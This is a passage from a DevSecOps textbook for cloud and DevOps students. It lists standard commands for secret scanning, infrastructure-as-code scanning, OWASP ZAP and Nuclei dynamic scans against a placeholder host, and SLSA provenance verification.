gitleaks detect
gitleaks protect --staged

# pre-commit
pre-commit install
pre-commit run --all-files
```

### IaC Scanning
```bash
# Checkov
checkov -d . --compact
checkov -d . --framework terraform --output sarif

# tfsec
tfsec . --minimum-severity HIGH

# KICS (Docker)
docker run checkmarx/kics scan -p /path -o /path/results
```

### DAST
```bash
# ZAP Baseline
docker run owasp/zap2docker-stable zap-baseline.py -t https://target.com -r report.html

# ZAP API Scan
docker run owasp/zap2docker-stable zap-api-scan.py -t https://target.com/openapi.json -f openapi -r report.html

# Nuclei
nuclei -u https://target.com -severity high,critical -o nuclei-results.json
```

### SLSA / Provenance
```bash
# Verify provenance
slsa-verifier verify-artifact binary.bin \
  --provenance-path binary.bin.intoto.jsonl \
  --source-uri github.com/org/repo
```

---

*DevSecOps & Supply Chain Security Book — For Cloud & DevOps Engineering Students*